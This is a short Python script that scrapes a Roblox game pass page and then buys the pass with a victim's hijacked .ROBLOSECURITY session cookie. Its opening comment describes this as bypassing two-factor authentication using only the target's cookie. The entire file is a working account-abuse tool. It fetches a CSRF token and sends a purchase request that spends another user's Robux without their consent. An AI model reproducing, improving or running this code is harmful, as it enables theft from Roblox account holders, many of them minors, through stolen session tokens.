# This script will purchase a chosen gamepass, ith the target's ROBLOSECURITY needed to authenticate the purchase. It bypasses 2FA so all you would need is a ROBLOSECURITY cookie.

import requests
from bs4 import BeautifulSoup

url = 'https://www.roblox.com/game-pass/gamepassid/gamepassname'  # Enter your gameapss url here

response = requests.get(url)

# Get required gamepass data
if response.status_code == 200:
    html_content = response.text

    soup = BeautifulSoup(html_content, 'html.parser')

    item_container = soup.find('div', id='item-container')

    ProductID = soup.find('div', id='item-container')['data-product-id']
    data_expected_currency = item_container['data-expected-currency']
    data_expected_price = item_container['data-expected-price']
    expected_seller_id = item_container['data-expected-seller-id']

    # Print out gamepass data for troubleshooting
    print('Product ID:', ProductID)
    print('data-expected-currency:', data_expected_currency)
    print('data-expected-price:', data_expected_price)
    print('data-expected-seller-id:', expected_seller_id)
    print(item_container)
else:
    print(f'Failed to retrieve the HTML content. Status code: {response.status_code}')

######################################################################################
cookie='_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|XXXXXXXXXXXXXXXXXX'# Their Roblox Token

# Create a session and set the Roblox cookie
session = requests.Session()
session.cookies['.ROBLOSECURITY'] = cookie

# Send the first request to get the X-CSRF token for Authentication
req = session.post(
    url='https://auth.roblox.com/'
)

if 'X-CSRF-Token' in req.headers:
    # Store the X-CSRF token in the session headers
    session.headers['X-CSRF-Token'] = req.headers['X-CSRF-Token']

# Define API Endpoint to buy gamepasses
url2 = f'https://economy.roblox.com/v1/purchases/products/{ProductID}'

# Send the data of the gamepass
data = {
    'expectedCurrency': int(data_expected_currency),
    'expectedPrice': int(data_expected_price),
    'expectedSellerId': int(expected_seller_id)
}

# Set up the headers for Authentication
headers = {
    'X-CSRF-TOKEN': session.headers.get('X-CSRF-Token'),  # Use the X-CSRF token from the session
    'Content-Type': 'application/json; charset=utf-8',
}

# Send the POST request
response = session.post(url2, json=data, headers=headers)

# Check the response status and content
if response.status_code == 200:
    print('POST request was successful!')
    print('Response content:', response.text)
else:
    print(f'Response text:', response.text)
    print(f'POST request failed with status code {response.status_code}')